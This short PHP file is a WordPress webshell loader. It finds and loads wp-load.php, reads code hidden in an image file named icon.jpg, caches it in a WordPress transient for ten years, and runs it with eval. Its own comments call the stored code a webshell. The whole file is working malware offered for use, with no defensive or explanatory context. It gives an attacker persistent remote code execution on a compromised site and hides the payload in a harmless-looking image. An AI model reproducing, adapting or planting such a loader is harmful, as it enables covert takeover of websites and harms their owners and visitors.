<?php
// Function to find wp-load.php by traversing up directories
function find_wp_load() {
    $dir = __DIR__;
    $max_depth = 10;
    $depth = 0;
    
    while ($depth < $max_depth) {
        $wp_load_path = $dir . '/wp-load.php';
        if (file_exists($wp_load_path)) {
            return $wp_load_path;
        }
        
        $parent_dir = dirname($dir);
        if ($parent_dir === $dir) {
            break;
        }
        
        $dir = $parent_dir;
        $depth++;
    }
    
    return false;
}

// Find WordPress
$wp_load = find_wp_load();
if ($wp_load === false) {
    die("wp-load.php not found!");
}
require_once $wp_load;

$key = 'my_webshell_codssss';
$saved = get_transient($key);

if ($saved === false) {
    // Look for icon.jpg in the same directory
    $file_path = __DIR__ . '/icon.jpg';
    
    if (!file_exists($file_path) || !is_readable($file_path)) {
        die("icon.jpg not found in: " . __DIR__);
    }
    
    // Read the webshell code from icon.jpg
    $saved = file_get_contents($file_path);
    
    if ($saved !== false && !empty($saved)) {
        set_transient($key, $saved, 10 * YEAR_IN_SECONDS);
    } else {
        die("icon.jpg is empty or unreadable.");
    }
}

// Execute the stored webshell code
eval('?>' . $saved);